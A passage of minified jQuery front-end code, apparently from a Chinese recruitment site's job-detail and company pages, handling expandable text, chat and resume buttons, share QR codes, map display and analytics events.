            e + 10 > i.height() ? $(this).hide() : $(this).show(),
            t.removeAttr("style"),
            i.removeAttr("style"))
        }),
        $(".fold-text .more-view").on("click", function() {
            $(this).find(".fz-slidedown").length ? ($(this).parent().css({
                "max-height": "none"
            }).addClass("expand"),
            $(this).html('收起<i class="fz fz-slideup"></i></a>').show()) : ($(this).parent().removeAttr("style").removeClass("expand"),
            $(this).removeAttr("style"),
            $(this).html('展开<i class="fz fz-slidedown"></i></a>').show())
        }),
        $(".tag-container"))
          , containerWidth = tagContainer.width()
          , tagContainerNew = (tagContainer.each(function(e, t) {
            var i = 0;
            $(this).find(".job-tags").not(".tag-all").find("span").each(function(e, t) {
                if (i += $(this).outerWidth() + 10,
                containerWidth < i)
                    return tagContainer.find(".tag-more").show().css({
                        opacity: 1,
                        left: i - $(this).outerWidth() - 10 + "px"
                    }),
                    !1
            })
        }),
        $(".tag-container-new"))
          , containerWidthNew = tagContainerNew.width()
          , similarJob = (tagContainerNew.each(function(e, t) {
            var i = 0;
            $(this).find(".job-tags").not(".tag-all").find("span").each(function(e, t) {
                if (i += $(this).outerWidth() + 10,
                containerWidthNew < i)
                    return tagContainerNew.find(".tag-more").show().css({
                        opacity: 1,
                        left: "auto",
                        right: 0
                    }),
                    tagContainerNew.css({
                        paddingRight: "43px"
                    }),
                    !1
            })
        }),
        $(".ranking-tag-icon").length && $(".ranking-tag-icon").each(function() {
            try {
                var e = $(this).data("code") || ""
                  , t = (window._jobInfo || {}).job_id || "";
                _T.sendEvent("detail-jd-weekcard-show", t, e + "")
            } catch (e) {}
        }),
        $(".company-card").on("click", function(e) {
            $(e.target).hasClass("btn") || (window.location.href = $(this).find(".btn").eq(0).attr("href"))
        }),
        $.each($(".detail-content .job-sec .fold-text"), function() {
            180 < $(this).height() ? $(this).find(".more-view").show() : $(this).find(".more-view").hide()
        }),
        84 < $(".company-info-box .job-sec-text").height() && $(".company-info-box .look-all").show().on("click", function(e) {
            e.preventDefault();
            e = $(this).parents(".company-info-box");
            e.hasClass("expand") ? (e.removeClass("expand"),
            $(this).text("查看全部")) : (e.addClass("expand"),
            $(this).text("收起"))
        }),
        $(".company-products-new li").hover(function() {
            var e = $(".company-product-intro", $(this));
            140 < e.outerHeight() ? e.find(".more-view").show() : e.find(".more-view").hide()
        }),
        $(".company-products-new .company-product-intro .more-view").on("click", function() {
            $(this).parent().hasClass("expand") ? $(this).text("展开") : $(this).text("收起"),
            $(this).parent().toggleClass("expand")
        }),
        $(".company-certification .company-certification-icon").on("click", function() {
            var e = $("#certification-content").html() || "";
            $.dialog({
                content: e,
                title: "",
                cancelText: !1,
                confirmText: !1,
                wrapClass: "company-certification-dialog",
                onOpen: function(e) {},
                onConfirm: function(e) {}
            })
        }),
        $(".job-primary .shield-popper").on("click", function(e) {
            e.stopPropagation()
        }),
        $(".job-primary .shield-tag").hover(function() {
            try {
                var e = $(".search-form .ipt-wrap .ipt-search").val() || ""
                  , t = $(this).parents(".info-primary").find(".primary-box")
                  , i = t.data("lid")
                  , n = t.data("jobid") + "";
                _T.sendEvent("action-search-company-bubbleshow", e, n, i)
            } catch (e) {}
        }, function() {}),
        $(".job-primary .shield-popper a").on("click", function(e) {
            e.stopPropagation();
            try {
                var t = $(".search-form .ipt-wrap .ipt-search").val() || ""
                  , i = $(this).parents(".info-primary").find(".primary-box")
                  , n = i.data("lid")
                  , a = i.data("jobid") + "";
                _T.sendEvent("action-search-company-bubbleclick", t, a, n)
            } catch (e) {}
        }),
        $(".job-detail .security-box .link-info").on("click", function(e) {
            try {
                var t = window.location.href.split("/job_detail/")[1].split(".html")[0];
                _T.sendEvent("action-detail-job-report", t, "2")
            } catch (e) {}
            e.preventDefault();
            var t = $(this).attr("href")
              , i = $.dialog({
                content: '<iframe id="security-knowledge-iframe" src="' + t + '" frameborder="0" allow="autoplay;fullscreen"></iframe>',
                title: "",
                closeText: !1,
                cancelText: !1,
                confirmText: !1,
                wrapClass: "security-knowledge-dialog",
                onClose: function() {
                    window.removeEventListener("message", n)
                }
            });
            function n(e) {
                "iframeClose" == e.data.type && i.close()
            }
            window.addEventListener("message", n)
        }),
        !function() {
            var e = $(".boss-info-attr .geek-evaluate-start")
              , t = e.data("score") || 0
              , i = Math.floor(t);
            if (e.length) {
                for (var n = "", a = 0; a < 5; a++) {
                    var o = "";
                    a < i ? o = "full-star" : a < t && (o = "half-star"),
                    n += '<em class="' + o + '"></em>'
                }
                e.html(n + (+t).toFixed(1))
            }
        }(),
        $(".similar-job-company, .job-company-logo", $(".similar-job-wrapper .similar-job-list")))
          , jobLogo = $(".info-company-logo, .company-logo-image", $(".job-detail .look-job-list"));
        function anonymityHandle(e) {
            e.length && $.each(e, function() {
                $(this).data("url") ? $(this).on("click", function() {
                    return window.open($(this).data("url")),
                    !1
                }) : $(this).addClass("is-anonymity")
            })
        }
        if (anonymityHandle(similarJob),
        anonymityHandle(jobLogo),
        $(".job-status .job-favor-icon").on("click", function() {
            $.dialog({
                content: '<iframe src="/mpa/html/rpo/conch" frameborder="0" allow="autoplay;fullscreen"></iframe>',
                title: "",
                closeText: !1,
                cancelText: !1,
                confirmText: !1,
                wrapClass: "favor-intro-dialog",
                onClose: function() {}
            });
            try {
                var e = $(this).data("uid")
                  , t = $(this).data("jid");
                _T.sendEvent("action-detail-job-excellentjobcheck", e, t)
            } catch (e) {}
        }),
        $(".job-status .school-enterprise-icon").on("click", function() {
            var e = $(this).data("url");
            e && $.dialog({
                content: '<iframe src="' + e + '" frameborder="0" allow="autoplay;fullscreen"></iframe>',
                title: "",
                closeText: !1,
                cancelText: !1,
                confirmText: !1,
                wrapClass: "school-enterprise-dialog",
                onClose: function() {}
            })
        }),
        $(".detail-content .security-box .link-report").on("click", function() {
            try {
                var e = window.location.href.split("/job_detail/")[1].split(".html")[0];
                _T.sendEvent("action-detail-job-report", e, "1")
            } catch (e) {}
        }),
        $(".search-job-list-wrap .complete-resume .btn-outline").on("click", function() {
            try {
                _T.sendEvent("lifecycle-resume-newEnt-click")
            } catch (e) {}
        }),
        $(".info-primary").on("click", ".detail-top-login", function() {
            try {
                _T.sendEvent("cpc_job_list_immediate_chat")
            } catch (e) {}
            ShowLoginDialog.showBossLogin({
                params: {
                    pk: "cpc_job_list_immediate_chat",
                    eventLog: {
                        p: "cpc_job_list_immediate_chat"
                    }
                }
            })
        }),
        $(".manager-list .fold-text").each(function() {
            84 < $(this).height() ? $(this).find(".more-view").show() : $(this).find(".more-view").hide()
        }),
        $(".company-info").length && $(".company-info .text").text().length < 250 && $(".company-info .look-all span").remove(),
        $(".job-op .btn-container, .smallbanner .btns, .smallbanner-bottom .btn-container").on("click", ".btn", function(e) {
            var t, i, n = $(this);
            if (n.hasClass("btn-send-phone")) {
                Detail.sendPhoneOrWechat(n);
                try {
                    var a = Detail.getQueryString("jobId", n.attr("data-url"));
                    (o = (window._PAGE || {}).uid || "") && _T.sendEvent("biz-item-topcard-quicksend", a, o + "", "1", "0")
                } catch (e) {}
            } else if (n.hasClass("btn-send-wechat"))
                Detail.sendWetchatAction(n);
            else if (n.hasClass("btn-outline")) {
                if ($(".detail-grab").length || $(".company-detail-grab").length && !n.hasClass("btn-disabled")) {
                    Detail.startChat(n);
                    try {
                        var o, a = Detail.getQueryString("jobId", n.attr("data-url"));
                        (o = (window._PAGE || {}).uid || "") && _T.sendEvent("biz-item-topcard-quicksend", a, o + "", "0", "0")
                    } catch (e) {}
                } else {
                    if (n.hasClass("btn-loading") || n.hasClass("btn-disabled"))
                        return;
                    Attachment.getAttachmentList(function(e) {
                        var t = {};
                        0 == e.code && e.zpData && (t = e.zpData),
                        0 == e.code ? 1 < (t = e.zpData).resumeCount ? Attachment.showResumeSelecter(t, {
                            callbackConfirm: function(e) {
                                Detail.deliveResume(n, "", e)
                            }
                        }) : 0 == t.resumeCount ? Attachment.showUploadWarning({
                            title: "请您上传附件简历，即可完成投递",
                            confirmText: "立即上传",
                            cancelText: "取消",
                            callbackUpload: function() {
                                n.click()
                            }
                        }) : (t = t.resumeList[0] ? t.resumeList[0].resumeId : "",
                        Detail.deliveResume(n, "", t)) : 7 == e.code || 1011 == e.code ? ShowLoginDialog.showBossLogin({
                            params: {
                                pk: n.attr("ka") || ""
                            }
                        }) : 24 == e.code && ($.toast({
                            content: "请到APP中切换到牛人身份后再重试",
                            type: "error"
                        }),
                        n.removeClass("btn-disabled"))
                    })
                }
                e.preventDefault()
            } else
                n.hasClass("btn-startchat") && (t = function(e) {
                    var t, i = e = (e || {}).payload || {};
                    void 0 === i.isCompletion || i.isCompletion || 0 != i.identity ? window.location.reload() : t = $.dialog({
                        title: "温馨提示",
                        content: '<p style="margin-bottom: 20px;">当前还未完善信息，是否要去完善</p>',
                        confirmText: "去完善",
                        cancelText: "取消",
                        type: "info",
                        wrapClass: "dialog-prop-default dialog-prop-radius",
                        closeLayer: !1,
                        onConfirm: function() {
                            window.open((i.webHost || "") + "/web/geek/guide/"),
                            t.hide()
                        },
                        onClose: function() {
                            window.location.reload()
                        }
                    })
                }
                ,
                "立即沟通" == $.trim(n.text() || "") ? (e.preventDefault(),
                i = $.Deferred(),
                $.ajax({
                    type: "get",
                    url: "/wapi/zpchat/config/get",
                    success: function(e) {
                        0 == e.code && e.zpData ? i.resolve(!!e.zpData.unreadBubble) : i.resolve(!1)
                    },
                    error: function() {
                        i.resolve(!1)
                    }
                }),
                i.then(function(e) {
                    e ? Detail.greetingTipTemplate().then(function(e) {
                        e && Detail.openChatDialog(n, "", {
                            loginSuccess: t
                        })
                    }) : Detail.startChat(n, "", {
                        loginSuccess: t
                    })
                })) : Detail.startChat(n, "", {
                    loginSuccess: t
                }))
        }),
        $(".link-like").on("click", function() {
            Detail.setInterest($(this), {
                successCallbackFn: function(e) {
                    1 == e.flag ? $(".btn-interest").text("感兴趣").removeClass("active") : $(".btn-interest").text("取消感兴趣").addClass("active")
                }
            })
        }),
        $(".job-primary .btn-interest").on("click", function(e) {
            e.preventDefault(),
            Detail.setInterest($(this), {
                eventArgs: {
                    normal: "top_job_detail_like",
                    active: "top_job_detail_like_cancel"
                },
                successCallbackFn: function(e) {
                    1 == e.flag ? ($(".btn-interest").text("感兴趣").removeClass("active"),
                    $(".link-like").text("感兴趣").removeClass("active")) : ($(".btn-interest").text("取消感兴趣").addClass("active"),
                    $(".link-like").text("取消感兴趣").addClass("active"))
                }
            })
        }),
        $(".smallbanner .btn-interest").on("click", function(e) {
            e.preventDefault(),
            Detail.setInterest($(this), {
                eventArgs: {
                    normal: "ceiling_job_detail_like",
                    active: "ceiling_job_detail_like_cancel"
                },
                successCallbackFn: function(e) {
                    1 == e.flag ? ($(".btn-interest").text("感兴趣").removeClass("active"),
                    $(".link-like").text("感兴趣").removeClass("active")) : ($(".btn-interest").text("取消感兴趣").addClass("active"),
                    $(".link-like").text("取消感兴趣").addClass("active"))
                }
            })
        }),
        $(".smallbanner-bottom .btn-interest").on("click", function(e) {
            e.preventDefault(),
            Detail.setInterest($(this), {
                eventArgs: {
                    normal: "bottom_job_detail_like",
                    active: "bottom_job_detail_like_cancel"
                },
                successCallbackFn: function(e) {
                    1 == e.flag ? ($(".btn-interest").text("感兴趣").removeClass("active"),
                    $(".link-like").text("感兴趣").removeClass("active")) : ($(".btn-interest").text("取消感兴趣").addClass("active"),
                    $(".link-like").text("取消感兴趣").addClass("active"))
                }
            })
        }),
        $(".link-wechat-share").on("click", function(e) {
            if ("A" != e.target.nodeName)
                return !1;
            var i = $(this)
              , n = $('<div id="wechat-qrcode-wrap">\n    <div class="arrow">\n        <span class="arrow-shadow"></span>\n        <span class="arrow-noumenon"></span>\n    </div>\n    <div class="qrcode">\n        <div class="qrcode-inner">\n           <img class="qrcode-img" src="" alt=""/>\n           <img class="brand-logo" src="" alt=""/>\n        </div>\n    </div>\n</div>');
            n.find(".qrcode-inner").hide(),
            n.appendTo(i).show(),
            $("<div id='wechat-qrcode-layer'></div>").appendTo(i.closest("body")),
            $("#wechat-qrcode-layer:not(#wechat-qrcode-wrap)").on("click", function(e) {
                $("#wechat-qrcode-wrap").remove(),
                $("#wechat-qrcode-layer").off("click").remove(),
                e.stopPropagation(),
                e.preventDefault()
            }),
            $.ajax({
                url: i.data("url"),
                type: "GET",
                dataType: "JSON"
            }).success(function(e) {
                var t;
                0 == e.code ? (n.find(".qrcode-img").attr("src", e.zpData),
                t = "https://img.bosszhipin.com/beijin/mcs/banner/20180813/4b1a485efe4a8c3cad3e25f33b0118fc81bc5d36f26f00574e0187ae0298df1a.jpg?x-oss-process=image/resize,l_69,image/circle,r_69/format,png",
                _jobInfo && _jobInfo.brand_logo && "" != _jobInfo.brand_logo && (t = _jobInfo.brand_logo + "?x-oss-process=image/resize,l_69,image/circle,r_69/format,png"),
                n.find(".brand-logo").attr("src", t),
                n.find(".qrcode-inner").show(),
                _T.sendEvent("mini_share_" + i.data("url").substring(i.data("url").indexOf("jobId=") + 6))) : ($("#wechat-qrcode-wrap").remove(),
                $("#wechat-qrcode-layer").off("click").remove(),
                $.toast({
                    type: "error",
                    content: e.message
                }))
            }).error(function() {
                $("#wechat-qrcode-wrap").remove(),
                $("#wechat-qrcode-layer").off("click").remove(),
                $.toast({
                    type: "error",
                    content: "获取分享码失败"
                })
            })
        }),
        $(".detail-hasmore .detail-hasmore-layer .detail-hasmore-btn").on("click", function() {
            $(this).closest(".detail-hasmore").removeClass("detail-hasmore")
        }),
        this.detailMap(),
        this.jobDetailMap(),
        this.mapCommuting(),
        $(".location-item").on("click", function() {
            try {
                var e = (window._brandInfo || {}).brand_id || "";
                $(this).hasClass("show-map") || _T.sendEvent("address-change-tab", e)
            } catch (e) {}
            $(this).parent().find(".location-item").removeClass("show-map"),
            $(this).addClass("show-map");
            var t, i = $(this).find(".map-container").eq(0);
            0 != i.length && $(this).hasClass("show-map") && (t = i.attr("data-content") || "",
            i.find("img").length || (i.attr("data-src") ? i.html('<img src="' + i.attr("data-src") + '" alt="公司地址"><p>点击查看地图</p>') : (seriesLoadScripts("https://webapi.amap.com/maps?v=2.0&key=bbe07e5beb2d72627d0836be0c458860&callback=GApiGeLoaded"),
            window.GApiGeLoaded = function() {
                AMap.plugin(["AMap.Geocoder"], function() {
                    (new AMap.Geocoder).getLocation(t, function(e, t) {
                        if ("complete" === e && "OK" === t.info) {
                            e = t.geocodes[0].location,
                            t = -1 < window.location.host.indexOf("weizhipin.com") ? "https://amap-proxy.weizhipin.com" : "https://amap-proxy.zpurl.cn";
                            i.html('<img src="' + t + "/v3/staticmap?zoom=16&amp;size=836*174&amp;markers=mid,0xFF0000,A:" + e.lng + "," + e.lat + '&amp;key=4ce180338a883b524313ffc22dfea73d" alt="公司地址"><p>点击查看地图</p>');
                            try {
                                _T.sendEvent("get_amap_self_pc")
                            } catch (e) {}
                        }
                    })
                })
            }
            )))
        }),
        $(".chat-history .btn-accept").on("click", function() {
            Detail.checkAcceptInvite($(this))
        }),
        $(".chat-history .btn-refuse").on("click", function() {
            Detail.refuseInvite($(this))
        }),
        $(".chat-history .btn-like").on("click", function() {
            Detail.setInterest($(this))
        }),
        $(".chat-history .btn-startchat").on("click", function() {
            Detail.startChat($(this))
        }),
        $(".job-address-li").on("click", ".btn-startchat", function(e) {
            e.stopPropagation(),
            Detail.startChat($(this))
        }),
        $(".company-hotjob").on("click", ".btn-startchat", function() {
            var e = $(this)
              , t = $(this).closest("a");
            Detail.startChat(e, "", {
                loginSuccess: function() {
                    e.wrap('<form action="' + t.attr("href") + '" method="get"></form>'),
                    e.append('<input type="hidden" name="ka" value="' + t.attr("ka") + '" />'),
                    e.append('<input type="hidden" name="lid" value="' + t.data("lid") + '" />'),
                    e.append('<input type="hidden" name="securityId" value="' + (t.data("securityid") || "") + '" />'),
                    e.closest("form").submit(),
                    e.find('input[name="ka"]').remove(),
                    e.find('input[name="lid"]').remove(),
                    e.find('input[name="securityId"]').remove(),
                    e.unwrap("form")
                }
            })
        }),
        $(".job-list").on("click", ".btn-startchat", function() {
            var t = $(this).data("url").split("?")[1].split("&")[0].split("=")[1]
              , e = $(this)
              , i = $(this).closest(".job-list li").find(".info-primary a");
            Detail.startChat(e, "", {
                success: function(e) {
                    _T.sendEvent((1011 == e.code ? "hoverjob_greet_tosign_" : "hoverjob_greet_") + t)
                },
                fail: function() {
                    _T.sendEvent("hoverjob_greet_" + t)
                },
                loginSuccess: function() {
                    e.wrap('<form action="' + i.attr("href") + '" method="get"></form>'),
                    e.append('<input type="hidden" name="ka" value="' + i.attr("ka") + '" />'),
                    e.append('<input type="hidden" name="lid" value="' + i.data("lid") + '" />'),
                    e.append('<input type="hidden" name="securityId" value="' + (i.data("securityid") || "") + '" />'),
                    e.closest("form").submit(),
                    e.find('input[name="ka"]').remove(),
                    e.find('input[name="lid"]').remove(),
                    e.find('input[name="securityId"]').remove(),
                    e.unwrap("form")
                }
            })
        }),
        $(".attachment-resume-upload").on("click", function() {
            Attachment.showUploadWarningPretreatment({
                showCvEntry: !0,
                title: "",
                confirmText: "上传附件简历"
            })
        }),
        $(".company-detail-grab").length && $(".company-detail-grab .load-more").on("click", function() {
            var el = $(".company-detail-grab").find(".job-list")
              , loadMoreBtn = el.find(".load-more")
              , nowPage = parseInt(el.attr("data-page"))
              , companyId = el.attr("data-companyid")
              , hasMore = el.attr("data-hasmore");
            "false" != hasMore && ($(this).find(".more").text("加载中..."),
            $.ajax({
                type: "GET",
                url: "/gongsi/ljobdata.json",
                data: {
                    companyId: companyId,
                    page: nowPage + 1
                },
                dataType: "json",
                success: function(result) {
                    "string" == typeof result && (result = eval("(" + result + ")")),
                    0 === result.code && (el.attr("data-page", nowPage + 1),
                    el.find("ul").append(result.zpData.html),
                    result.zpData.hasMore || loadMoreBtn.hide()),
                    loadMoreBtn.find(".more").text("点击加载更多")
                },
                error: function(e) {}
            }))
        }),
        "undefined" != typeof _userInfo) {
            this.showMes();
            var that = this, conTip, conTip;
            if (_userInfo.isLogin ? _userInfo.isPerfect || (conTip = $(".container-tip"),
            setTimeout(function() {
                Detail.canClick = !0,
                $(".avatar img").on("click", function() {
                    that.showGuide()
                })
            }, 4e3),
            $(".tip-box a").attr("href", "/web/geek/guide")) : (conTip = $(".container-tip"),
            setTimeout(function() {
                Detail.canClick = !0,
                $(".avatar img").on("click", function() {
                    $(".jconfirm").length && $(".jconfirm").remove(),
                    Detail.canClick && that.showGuide()
                })
            }, 4e3),
            $(".container-tip .tip-box>a").on("click", function() {
                var e;
                $(".jconfirm").length && $(".jconfirm").remove(),
                1 != $(this).data("load") && ((e = $(this)).data("load", !0),
                $(".container-tip").fadeOut(function() {
                    $.confirm({
                        content: $("#pop-hide-container").html(),
                        title: !1,
                        confirmButton: !1,
                        cancelButton: !1,
                        closeIcon: !0,
                        columnClass: "pop-sign-box",
                        onOpen: function() {
                            Singup.init()
                        },
                        onClose: function() {
                            Singup.cdAni && (clearInterval(Singup.cdAni),
                            Singup.cdAni = null),
                            that.showMes()
                        }
                    }),
                    e.data("load", !1)
                }))
            })),
            _userInfo.hasKaAnotherS)
                try {
                    _T.sendEvent("detail_with_another_s_from_same_boss")
                } catch (e) {}
        }
        $(".job-detail .recommend-box .slider-main").length && $(".job-detail .recommend-box .slider-main").hwSlider({
            autoPlay: !1,
            arrShow: !0,
            dotShow: !0,
            navShow: !0,
            touch: !0,
            width: 834,
            height: 391
        }),
        $(".job-detail .job-address-box .slider-main").length && $(".job-detail .job-address-box .slider-main").hwSlider({
            autoPlay: !1,
            arrShow: !0,
            dotShow: !0,
            navShow: !0,
            touch: !0,
            width: 834,
            height: 391
        }),
        $(".job-detail .omnibus-job-box .omnibus-slider-main").length && $(".job-detail .omnibus-job-box .omnibus-slider-main").hwSlider({
            autoPlay: !1,
            arrShow: !1,
            navShow: !1,
            touch: !1,
            dotShow: !0,
            width: 824,
            height: 220
        }),
        Detail.pushJobLocal(),
        Detail.popupGuide();
        var smallBanner = $(".smallbanner"), jobBanner = $(".job-banner"), companyBanner = $(".company-banner"), offsetHeight = $("#header").outerHeight(), isSliding = (jobBanner.length ? offsetHeight += jobBanner.outerHeight() : companyBanner.length && (offsetHeight += companyBanner.outerHeight()),
        !1), $selects, hoverTimer, hoverTimer;
        function showBanner() {
            $(this).scrollTop() >= offsetHeight ? isSliding || (isSliding = !0,
            smallBanner.slideDown(300, function() {
                isSliding = !1
            })) : smallBanner.hide()
        }
        smallBanner.length && 260 < $(document).height() - $(window).height() && (showBanner(),
        $(window).scroll(function() {
            showBanner()
        })),
        isVisiable($(".job-location")[0]) && Detail.companyDetail(),
        $(window).scroll(function() {
            isVisiable($(".job-location")[0]) && Detail.companyDetail()
        }),
        0 < $(".job-select").length && ($selects = $(".job-select"),
        $(".job-select").on("mouseenter", function() {
            $(this).addClass("open");
            var e = $(this).attr("data-ka");
            if (e)
                try {
                    _T.sendEvent(e)
                } catch (e) {}
        }).on("mouseleave", function() {
            $(this).removeClass("open")
        })),
        0 < $("#jobFilter").length && 0 < $(".job-filter").length && $("#jobFilter").on("click", function() {
            if ($(this).parent().toggleClass("job-filter-show").hasClass("job-filter-show"))
                try {
                    _T.sendEvent("comp_filter")
                } catch (e) {}
        }),
        $(".company-job .job-list li > a").on("click", function(e) {
            var t = $(this).attr("href") || "";
            t && (e.preventDefault(),
            e = $(this).data("securityid") || "",
            t = -1 < t.indexOf("?") ? t + "&securityId=" + e : t + "?securityId=" + e,
            window.open(t, "_blank"))
        });
        {
            function setPopjobTop(e, t, i) {
                var n = e.find(".info-detail")
                  , a = document.documentElement.clientHeight - t.get(0).getBoundingClientRect().top
                  , o = n.height();
                a < o + 18 && n.css("top", -(o - a + 18) + "px"),
                t.addClass("hover"),
                e.addClass("cur"),
                hoverTimer = setTimeout(function() {
                    try {
                        _T.sendEvent("show_popjob_" + i)
                    } catch (e) {}
                }, 1e3)
            }
            0 < $(".company-job").length && (hoverTimer = "",
            $(".job-list .info-primary h3.name").each(function(e) {
                var i = $(this)
                  , n = i.closest("[data-jid]").attr("data-jid")
                  , a = i.closest("[data-lid]").attr("data-lid");
                i.hoverDelay({
                    hoverDuring: 400,
                    hoverEvent: function() {
                        var t = i.find(".info-detail");
                        "" == $.trim(t.text()) ? $.ajax({
                            type: "GET",
                            url: "/wapi/zpgeek/view/job/card.json",
                            data: {
                                jid: n,
                                lid: a,
                                type: 2
                            },
                            dataType: "json",
                            success: function(e) {
                                0 == e.code && (e = e.zpData.html,
                                t.html(e),
                                setPopjobTop(i, i.closest("li"), n))
                            }
                        }) : setPopjobTop(i, i.closest("li"), n)
                    },
                    outEvent: function() {
                        clearTimeout(hoverTimer),
                        i.removeClass("cur");
                        var e = $("body").hasClass("company-position-wrapper") ? 24 : 16;
                        i.find(".info-detail").css("top", -e + "px"),
                        i.closest("li").removeClass("hover")
                    }
                })
            }))
        }
        {
            function setPopjobTop(e, t) {
                e.addClass("cur"),
                hoverTimer = setTimeout(function() {
                    try {
                        _T.sendEvent("show_popjob_" + t)
                    } catch (e) {}
                }, 1e3)
            }
            0 < $(".company-hotjob").length && (hoverTimer = "",
            $(".company-hotjob li").each(function() {
                var i = $(this)
                  , n = i.find("[data-jid]").attr("data-jid")
                  , e = i.find("[data-lid]").attr("data-lid");
                i.hoverDelay({
                    hoverDuring: 400,
                    hoverEvent: function() {
                        var t = i.find(".info-detail");
                        "" == $.trim(t.text()) ? $.ajax({
                            type: "GET",
                            url: "/wapi/zpgeek/view/job/card.json",
                            data: {
                                jid: n,
                                lid: e,
                                type: 2
                            },
                            dataType: "json",
                            success: function(e) {
                                0 == e.code && (e = e.zpData.html,
                                t.html(e),
                                setPopjobTop(i, i.closest("li"), n))
                            }
                        }) : setPopjobTop(i, n)
                    },
                    outEvent: function() {
                        clearTimeout(hoverTimer),
                        i.removeClass("cur")
                    }
                })
            }))
        }
        function deleteRow(e) {
            for (var t = e.rows.length - 1; 4 <= t; t--)
                deletedRows.unshift(e.rows[t].outerHTML),
                e.deleteRow(t)
        }
        function insertRow(e) {
            for (var t = e.rows.length + deletedRows.length, i = 4; i < t; i++)
                e.insertRow(i).outerHTML = deletedRows.shift()
        }
        var $equityInfo = $(".equity-info"), $equityTable = $(".equity-table"), equityTable = $(".equity-table").get(0), deletedRows = [], $fakeBanner = ($(".equity-table .equity-expand-btn label").click(function() {
            "展开" == $(this).text() ? ($(this).html('<span>收起</span><i class="fz fz-slideup"></i>'),
            $(".company-detail-grab .company-equity .equity-detail .equity-table .row-3 ~ tr").css("display", "table-row")) : ($(this).html('<span>展开</span><i class="fz fz-slidedown"></i>'),
            $(".company-detail-grab .company-equity .equity-detail .equity-table .row-3 ~ tr").css("display", "none"))
        }),
        $(".company-detail-grab .company-banner")), $jobBox = $(".company-detail-grab .job-box"), elFakeBanner = $fakeBanner.get(0), bannerRect, elAnchors = ($fakeBanner.length && (bannerRect = elFakeBanner.getBoundingClientRect(),
        window.onscroll = function() {
            document.documentElement.scrollTop >= bannerRect.bottom ? ($fakeBanner.addClass("fixed"),
            $jobBox.css("marginTop", 30 + bannerRect.height)) : ($fakeBanner.removeClass("fixed"),
            $jobBox.css("marginTop", 30))
        }
        ),
        document.querySelectorAll(".company-detail-grab .company-tab a")), elSectionTitles = document.querySelectorAll(".job-sec h3"), $el, $titleItems, $linksContents, $expandBtn;
        function switchExpandVisibility() {
            var e = $(".links-content.cur");
            0 < e.length && (155 < e.height() ? $(".links-box .expand-btn").css("display", "block") : $(".links-box .expand-btn").css("display", "none"))
        }
        $fakeBanner.length && $(elAnchors).on("click", function(e) {
            if ("公司简介" == this.innerText && (-1 < window.location.pathname.indexOf("/gongsi/") || -1 < window.location.pathname.indexOf("/gongsis/")) && (e.preventDefault(),
            $("html,body").animate({
                scrollTop: 0
            })),
            "工商信息" == this.innerText || "股权信息" == this.innerText || "公司地址" == this.innerText)
                for (var t = 0; t < elSectionTitles.length; t++)
                    this.innerText == elSectionTitles[t].innerText && $("html,body").animate({
                        scrollTop: $(elSectionTitles[t]).offset().top - bannerRect.height
                    });
            "招聘职位" == this.innerText && $("html,body").animate({
                scrollTop: $(".job-sec.search-box").offset().top - bannerRect.height
            });
            for (var i = 0; i < elAnchors.length; i++)
                elAnchors[i].innerText !== this.innerText && $(elAnchors[i]).removeClass("cur");
            $(this).addClass("cur")
        }),
        0 < $(".links-box").length && ($el = $(".links-box"),
        $titleItems = $(".links-box .title-item"),
        $linksContents = $(".links-box .links-content"),
        $expandBtn = $(".links-box .expand-btn a"),
        switchExpandVisibility(),
        $linksContents.addClass("limited"),
        $el.on("click", ".title-item", function() {
            var e = $(this)
              , t = e.index();
            $titleItems.removeClass("cur"),
            $linksContents.removeClass("cur"),
            e.addClass("cur"),
            $($linksContents[t]).addClass("cur").removeClass("limited"),
            switchExpandVisibility(),
            $linksContents.addClass("limited"),
            $expandBtn.html('<span>展开</span><i class="fz fz-slidedown"></i>')
        }),
        $expandBtn.on("click", function() {
            var e = $(".links-wrapper").find(".cur");
            e.toggleClass("limited"),
            e.hasClass("limited") ? $expandBtn.html('<span>展开</span><i class="fz fz-slidedown"></i>') : $expandBtn.html('<span>收起</span><i class="fz fz-slideup"></i>')
        })),
        0 < $(".company-job.company-desc .job-list li").length && $(".company-job.company-desc .job-list").on("click", "li", function(e) {
            var t, i, n;
            "A" !== e.target.nodeName && -1 === e.target.className.indexOf("startchat") && (n = (t = (e = $(this)).find('a[href*="job_detail"]')).attr("href"),
            i = $(this).find("[data-lid]").attr("data-lid"),
            n = '<form action="' + n + '" method="get" target="_blank" style="display: none;"><input type="hidden" name="ka" value="' + t.attr("ka") + '_blank" /><input type="hidden" name="lid" value="' + i + '" /></form>',
            e.append(n),
            e.find("form").submit(),
            e.find("form").remove())
        }),
        0 < $(".job-list").length && $(".job-list").on("click", ".false-link", function() {
            return !1
        });
        var wechatWrapper = $(".subscribe-wechat-wrapper");
        wechatWrapper.length && Detail.jobSubscribe(wechatWrapper),
        Detail.sidFlowMask(),
        Detail.sidFlowFullMask()
    },
    greetingTipTemplate: function() {
        var o = $.Deferred();
        try {
            var s = (window._PAGE || {}).uid || ""
              , e = s && 1 == $.cookie("register_unique_flag_" + s)
              , t = Storage.get("greet_already_tip_unique_" + s);
            if (!e || t)
                return o.resolve(!0);
            $.ajax({
                type: "get",
                url: "/wapi/zpchat/greeting/getTipTemplate",
                success: function(e) {
                    if (0 == e.code && e.zpData) {
                        if (!e.zpData.isComplete)
                            return window.location.href = "/web/geek/guide",
                            o.resolve(!1);
                        Storage.set("greet_already_tip_unique_" + s, "1");
                        var a = e.zpData.greetings || [];
                        $.dialog({
                            title: "",
                            content: ['<div class="greet-sb-title"><span class="title-bg"></span><p class="sub-title">这是你的第一次沟通，发送招呼开始聊天吧～</p></div>', '<div class="greet-sb-list"><p class="greet-empty-box"><img src="https://img.bosszhipin.com/static/file/2022/a01kqbjd7l1655973421679.png" /><span>当前无招呼语数据</span></p></div>', '<p class="more-greet-box"><a href="/web/geek/privacy-set?type=greetSet" ka="more_greet_template">更多招呼语</a></p>', '<div class="operate-list"><a href="javascript:;" ka="sure_change_default_greet" class="bth-greet-sure">确定</a></div>'].join(""),
                            cancelText: !1,
                            confirmText: !1,
                            closeLayer: !1,
                            wrapClass: "greet-sb-dialog",
                            onClose: function(e) {
                                o.resolve(!0);
                                try {
                                    var t;
                                    "confirm" != e && "cancel" != e && (t = window._jobInfo || {},
                                    _T.sendEvent("detial-geek-greeting-click", t.user_id, t.job_id, "0", ""))
                                } catch (e) {}
                            },
                            onOpen: function(i) {
                                try {
                                    var e = window._jobInfo || {};
                                    _T.sendEvent("detial-geek-greeting-expo", e.user_id, e.job_id)
                                } catch (e) {}
                                $(".bth-greet-sure", i).on("click", function() {
                                    if (i.remove(),
                                    !a.length) {
                                        try {
